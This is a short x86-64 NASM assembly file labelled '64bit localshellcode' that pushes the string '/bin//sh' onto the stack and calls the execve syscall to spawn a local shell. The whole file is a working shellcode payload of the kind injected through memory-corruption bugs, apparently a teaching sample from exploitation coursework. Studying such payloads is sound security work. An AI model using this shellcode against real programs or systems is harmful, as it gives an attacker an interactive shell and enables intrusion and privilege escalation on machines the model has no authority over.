	;; 021813
	;; Evan Jensen 64bit localshellcode
	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
BITS 64
	
%include "short64.s"
	
global main

main:
	xor  rax, rax
	push rax
	mov  rdi, 0x68732f2f6e69622f ;/bin//sh
	push rdi
	mov  al,  execve
	mov  rdi, rsp
	xor  rsi, rsi
	xor  rdx, rdx
	syscall

